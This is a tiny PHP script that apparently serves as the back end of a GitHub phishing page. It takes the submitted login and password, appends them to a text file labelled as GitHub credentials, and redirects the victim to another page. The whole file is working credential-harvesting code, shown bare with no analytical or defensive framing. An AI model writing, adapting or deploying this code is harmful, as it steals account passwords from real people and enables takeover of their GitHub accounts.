<?php

file_put_contents("usernames.txt", "Github Username: " . $_POST['login'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: yata.html');
exit();
?>